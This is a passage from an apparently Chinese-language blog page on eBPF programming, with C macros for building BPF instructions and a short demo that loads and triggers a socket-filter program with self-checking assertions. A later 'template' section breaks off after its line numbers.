class="meta">                      sizeof((insns)) / sizeof((insns)[0]))</span></span><br><span class="line"><span class="comment">/* struct bpf_insn的wrapper宏,</span></span><br><span class="line"><span class="comment"> * 参考自内核源代码中的kernel/samples/bpf/bpf_insn.h</span></span><br><span class="line"><span class="comment"> * 其余相关的宏参考/usr/include/linux/bpf_common.h</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ebpf的指令集信息可参考</span></span><br><span class="line"><span class="comment"> * https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * R0: return value from function calls, and exit value for eBPF programs</span></span><br><span class="line"><span class="comment"> * R1 - R5: arguments for function calls</span></span><br><span class="line"><span class="comment"> * R6 - R9: callee saved registers that function calls will preserve</span></span><br><span class="line"><span class="comment"> * R10: read-only frame pointer to access stack</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)  \</span></span><br><span class="line"><span class="meta">  ((struct bpf_insn) &#123;                          \</span></span><br><span class="line"><span class="meta">    .code     = CODE,                           \</span></span><br><span class="line"><span class="meta">    .dst_reg  = DST,                            \</span></span><br><span class="line"><span class="meta">    .src_reg  = SRC,                            \</span></span><br><span class="line"><span class="meta">    .off      = OFF,                            \</span></span><br><span class="line"><span class="meta">    .imm      = IMM &#125;)</span></span><br><span class="line"><span class="comment">/* dst_reg OP= src_reg,</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * OP包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_ADD(+)   BPF_SUB(-)  BPF_MUL(*)</span></span><br><span class="line"><span class="comment"> * BPF_DIV(/)   BPF_OR(|)   BPF_AND(&amp;)</span></span><br><span class="line"><span class="comment"> * BPF_LSH(&lt;&lt;)  BPF_RSH(&gt;&gt;) BPF_NEG(~)</span></span><br><span class="line"><span class="comment"> * BPF_MOD(%)   BPF_XOR(^)  BPF_MOV(=)</span></span><br><span class="line"><span class="comment"> * ...，参考https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X,  \</span></span><br><span class="line"><span class="meta">               DST, SRC, 0, 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU32_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_X,  \</span></span><br><span class="line"><span class="meta">               DST, SRC, 0, 0)</span></span><br><span class="line"><span class="comment">/* dst_reg OP= imm32,</span></span><br><span class="line"><span class="comment"> * OP包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_ADD(+)   BPF_SUB(-)  BPF_MUL(*)</span></span><br><span class="line"><span class="comment"> * BPF_DIV(/)   BPF_OR(|)   BPF_AND(&amp;)</span></span><br><span class="line"><span class="comment"> * BPF_LSH(&lt;&lt;)  BPF_RSH(&gt;&gt;) BPF_NEG(~)</span></span><br><span class="line"><span class="comment"> * BPF_MOD(%)   BPF_XOR(^)  BPF_MOV(=)</span></span><br><span class="line"><span class="comment"> * ...，参考https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU64_IMM32(OP, DST, IMM)           \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K,  \</span></span><br><span class="line"><span class="meta">               DST, 0, 0, (IMM))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ALU32_IMM32(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K,  \</span></span><br><span class="line"><span class="meta">               DST, 0, 0, (IMM))</span></span><br><span class="line"><span class="comment">/* *(dst_reg + off16) = imm32</span></span><br><span class="line"><span class="comment"> * SIZE包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_B(8-bit)   BPF_H(16-bit)</span></span><br><span class="line"><span class="comment"> * BPF_W(32-bit)  BPF_DW(64-bit)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ST_MEM(SIZE, DST, OFF, IMM)   \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,   \</span></span><br><span class="line"><span class="meta">               DST, 0, OFF, IMM)</span></span><br><span class="line"><span class="comment">/* *(dst_reg + off16) = src_reg</span></span><br><span class="line"><span class="comment"> * SIZE包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_B(8-bit)   BPF_H(16-bit)</span></span><br><span class="line"><span class="comment"> * BPF_W(32-bit)  BPF_DW(64-bit)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)   \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,   \</span></span><br><span class="line"><span class="meta">               DST, SRC, OFF, 0)</span></span><br><span class="line"><span class="comment">/* dst_reg = *(src_reg + off16)</span></span><br><span class="line"><span class="comment"> * SIZE包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_B(8-bit)   BPF_H(16-bit)</span></span><br><span class="line"><span class="comment"> * BPF_W(32-bit)  BPF_DW(64-bit)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)   \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,   \</span></span><br><span class="line"><span class="meta">               DST, SRC, OFF, 0)</span></span><br><span class="line"><span class="comment">/* dst_reg = *(imm64)</span></span><br><span class="line"><span class="comment"> * SIZE包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_B(8-bit)   BPF_H(16-bit)</span></span><br><span class="line"><span class="comment"> * BPF_W(32-bit)  BPF_DW(64-bit)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_LD_IMM64(DST, IMM)  \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM,     \</span></span><br><span class="line"><span class="meta">               DST, 0, 0, (__u32)(IMM)),      \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(0, 0, 0, 0, ((__64)(IMM)) &gt;&gt; 32)</span></span><br><span class="line"><span class="comment">/* if (dst_reg OP src_reg) goto pc + off16</span></span><br><span class="line"><span class="comment"> * OP包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_JEQ(==)          BPF_JGT(unsigned &lt;)</span></span><br><span class="line"><span class="comment"> * BPF_JGE(unsigned &gt;=) BPF_JNE(!=)</span></span><br><span class="line"><span class="comment"> * BPF_JLT(unsigned &lt;)  BPF_JLE(unsigned &lt;=)</span></span><br><span class="line"><span class="comment"> * BPF_CALL             BPF_EXIT</span></span><br><span class="line"><span class="comment"> * ...，参考https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP_REG(OP, DST, SRC, OFF)  \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X,  \</span></span><br><span class="line"><span class="meta">               DST, SRC, OFF, 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP32_REG(OP, DST, SRC, OFF)  \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X,  \</span></span><br><span class="line"><span class="meta">               DST, SRC, OFF, 0)</span></span><br><span class="line"><span class="comment">/* if (dst_reg OP imm32) goto pc + off16</span></span><br><span class="line"><span class="comment"> * OP包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_JEQ(==)          BPF_JGT(unsigned &lt;)</span></span><br><span class="line"><span class="comment"> * BPF_JGE(unsigned &gt;=) BPF_JNE(!=)</span></span><br><span class="line"><span class="comment"> * BPF_JLT(unsigned &lt;)  BPF_JLE(unsigned &lt;=)</span></span><br><span class="line"><span class="comment"> * BPF_CALL(参考man bpf-helpers，调用)</span></span><br><span class="line"><span class="comment"> * BPF_EXIT</span></span><br><span class="line"><span class="comment"> * ...，参考https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP_IMM32(OP, DST, IMM, OFF)  \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K,  \</span></span><br><span class="line"><span class="meta">               DST, 0, OFF, IMM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JMP32_IMM32(OP, DST, IMM, OFF)  \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K,  \</span></span><br><span class="line"><span class="meta">               DST, 0, OFF, IMM)</span></span><br><span class="line"><span class="comment">/* if (!(dst_reg OP src_reg)) exit</span></span><br><span class="line"><span class="comment"> * OP包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_JEQ(==)          BPF_JGT(unsigned &lt;)</span></span><br><span class="line"><span class="comment"> * BPF_JGE(unsigned &gt;=) BPF_JNE(!=)</span></span><br><span class="line"><span class="comment"> * BPF_JLT(unsigned &lt;)  BPF_JLE(unsigned &lt;=)</span></span><br><span class="line"><span class="comment"> * BPF_CALL(参考man bpf-helpers，调用)</span></span><br><span class="line"><span class="comment"> * BPF_EXIT</span></span><br><span class="line"><span class="comment"> * ...，参考https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_EXIT_INSN()  \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ASSERT_REG(OP, DST, SRC) \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X,  \</span></span><br><span class="line"><span class="meta">               DST, SRC, 1, 0), \</span></span><br><span class="line"><span class="meta">  BPF_EXIT_INSN()</span></span><br><span class="line"><span class="comment">/* if (!(dst_reg OP imm32)) exit</span></span><br><span class="line"><span class="comment"> * OP包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_JEQ(==)          BPF_JGT(unsigned &lt;)</span></span><br><span class="line"><span class="comment"> * BPF_JGE(unsigned &gt;=) BPF_JNE(!=)</span></span><br><span class="line"><span class="comment"> * BPF_JLT(unsigned &lt;)  BPF_JLE(unsigned &lt;=)</span></span><br><span class="line"><span class="comment"> * BPF_CALL(参考man bpf-helpers，调用)</span></span><br><span class="line"><span class="comment"> * BPF_EXIT</span></span><br><span class="line"><span class="comment"> * ...，参考https://docs.kernel.org/bpf/instruction-set.html</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * REG包括如下候选</span></span><br><span class="line"><span class="comment"> * BPF_REG_0  BPF_REG_1  BPF_REG_2</span></span><br><span class="line"><span class="comment"> * BPF_REG_3  BPF_REG_4  BPF_REG_5</span></span><br><span class="line"><span class="comment"> * BPF_REG_6  BPF_REG_7  BPF_REG_8</span></span><br><span class="line"><span class="comment"> * BPF_REG_9  BPF_REG_10</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_ASSERT_IMM32(OP, DST, IMM) \</span></span><br><span class="line"><span class="meta">  BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K,  \</span></span><br><span class="line"><span class="meta">               DST, 0, 1, IMM), \</span></span><br><span class="line"><span class="meta">  BPF_EXIT_INSN()</span></span><br><span class="line"><span class="comment">/* bpf_prog_load()将bpf程序装载入内核中，然后trigger_bpf()</span></span><br><span class="line"><span class="comment"> * 会将对应的bpf程序关联到对应事件的hook点，并产生相关事件，来</span></span><br><span class="line"><span class="comment"> * 触发执行对应的bpf程序</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 参数:</span></span><br><span class="line"><span class="comment"> *    1. @progfd:即bpf_prog_load()返回的关联bpf程序的文件描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger_bpf</span><span class="params">(<span class="type">int</span> progfd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sockets[<span class="number">2</span>];</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x80</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将bpf程序关联到该socket的PACKET FILTER事件</span></span><br><span class="line">  assert(socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets) == <span class="number">0</span>);</span><br><span class="line">  assert(setsockopt(sockets[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 向socket中写数据，从而触发PACKET FILTER事件，执行关联的bpf程序</span></span><br><span class="line">  assert(write(sockets[<span class="number">1</span>], buf, <span class="keyword">sizeof</span>(buf)) == <span class="keyword">sizeof</span>(buf));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> progfd;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">    BPF_ALU64_IMM32(BPF_MOV, BPF_REG_0, <span class="number">0x1737</span>),    <span class="comment">/* r0 = 0x1737 */</span></span><br><span class="line">    BPF_ASSERT_IMM32(BPF_JEQ, BPF_REG_0, <span class="number">0x1737</span>),   <span class="comment">/* assert(r0 = 0x1737) */</span></span><br><span class="line">    BPF_ALU64_REG(BPF_MOV, BPF_REG_2, BPF_REG_0),   <span class="comment">/* r2 = r0 */</span></span><br><span class="line">    BPF_ASSERT_IMM32(BPF_JEQ, BPF_REG_2, <span class="number">0x1737</span>),   <span class="comment">/* assert(r2 = 0x1737) */</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_2, <span class="number">-0x8</span>), <span class="comment">/* *(uint64_t*)(r10 - 0x8) = r2 */</span></span><br><span class="line">    BPF_LDX_MEM(BPF_B, BPF_REG_9, BPF_REG_10, <span class="number">-0x8</span>), <span class="comment">/* r9 = *(uint8_t*)(r10 - 0x8) */</span></span><br><span class="line">    BPF_ASSERT_IMM32(BPF_JEQ, BPF_REG_9, <span class="number">0x37</span>),     <span class="comment">/* assert(r9 = 0x37) */</span></span><br><span class="line">    BPF_EXIT_INSN(),                                <span class="comment">/* exit */</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 创建一个socket，并发送数据包，从而触发bpf */</span></span><br><span class="line">  trigger_bpf(progfd);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="模板姿势"><a href="#模板姿势" class="headerlink" title="模板姿势"></a>模板姿势</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span 